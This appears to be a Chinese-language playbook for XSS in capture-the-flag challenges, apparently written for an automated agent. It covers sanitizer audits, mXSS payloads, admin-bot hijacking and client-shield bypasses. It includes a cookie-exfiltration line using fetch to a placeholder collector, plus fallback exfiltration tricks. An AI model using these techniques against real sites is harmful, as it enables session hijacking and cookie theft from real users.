# XSS 专项打法

适用：存储型/反射型/DOM XSS，净化器（DOMPurify 类）绕过，管理员机器人劫持场景。

## 白盒优先：审计净化链路（拿到源码时）

1. **定位净化调用链**：搜索 `sanitize` / `DOMPurify` / `escape` / `xss` / `bleach`，
   确认净化的**输入是什么、输出去哪**——SSR 场景关键看"净化后的 HTML 是否再次
   进入解析器"（双重解析 = mXSS 温床）
2. **查配置缺陷**：
   - `ADD_ATTR` / `ADD_TAGS` 白名单放行了事件属性（`onerror`/`onload`）或危险标签
   - `USE_PROFILES: {html: true}` 放行 `svg`/`math`——经典 mutation XSS 入口
   - 净化后字符串又做了字符串替换（`replace`/`innerHTML` 二次处理），顺序漏洞
3. **区分净化点**：服务端净化 ≠ 客户端安全——若服务端净化后模板引擎又做变量
   插值（如 `<%= user %>` 未转义部分），净化白忙
4. **机器人行为模拟**：读 bot 源码（附件里常有）——确认 bot 的
   - Cookie 策略（`httpOnly`/`sameSite`，决定能否 `document.cookie` 直读）
   - 访问路径（审核页面 URL 参数格式 → 构造触发链接）
   - 等待时间（注入 payload 的异步外带要用 `setTimeout`/img 立即触发）

## 黑盒手法（无源码时）

1. **探针矩阵**：提交含标记的输入（`<b>`, `<svg>`, `javascript:`, 事件属性），
   观察输出的**规范化痕迹**（属性顺序、大小写、引号处理）反推净化器身份
2. **mXSS 方向**：输入在 HTML 属性/注释/textarea 上下文时，提交
   `<svg><style><img src=x onerror=...>` 类嵌套，观察服务端序列化后是否变形
3. **外带通道**：`fetch('http://你的收集端/'+document.cookie)`——无收集端时，
   用目标自身（把 cookie 写进新文章标题再读列表）或请求时间侧信道

## 纪律

- **本地复现优先于盲测远程**（author_plus 教训：200 步耗在远程时序 oracle 上，
  而附件自带 node 源码——`npm i dompurify jsdom` 本地起净化器逐 payload 验证
  只要 10 分钟。远程 bot 每次验证 ~10s，本地无限快。顺序必须是：
  读源码 → 本地复现净化器 → 本地复现 shield/浏览器 → 最后才打远程）
- **盲 XSS 需要 oracle**：没有回显时，先造检测 oracle（如导航到黑洞 IP 的
  时序差、`document.title` 变化），再批量测 payload——不要边测边改 oracle
- 不要盲 fuzz 大字典：先读源码定位净化函数，10 次定向尝试 > 1000 次盲目 fuzz
- 每次尝试记录"输入→净化输出"对（`record_fact`），变形模式是突破口
- 确认触发后才 `report_finding`（inferred），拿到 flag/cookie 才算数

## 多层防护拆解清单（遇到净化器+客户端 shield 组合时逐层问）

1. 净化层：版本？配置（ADD_ATTR/USE_PROFILES）？宿主（jsdom scripting 开关）？
   实体编码绕过？mXSS（序列化不转义 < 的属性值、noscript 差分）？
2. 渲染上下文：内容进 HTML 正文还是属性？还有哪个页面回显同一份数据且防护更弱？
3. 客户端 shield：拦了什么（列清单）？**没拦什么**——`onbegin` 等 SVGElement
   原型上的处理器可能绕过 Element.prototype 重定义；`location.href`、
   `document.title`、`Object.getOwnPropertyDescriptor(Document.prototype,...)`
   常被漏网
4. 外带：fetch/XHR 被封后还剩什么——GET 导航/meta/img.src 属性改值、
   views 计数器、表单原生提交。外带终点必须是攻击者可读的回显点
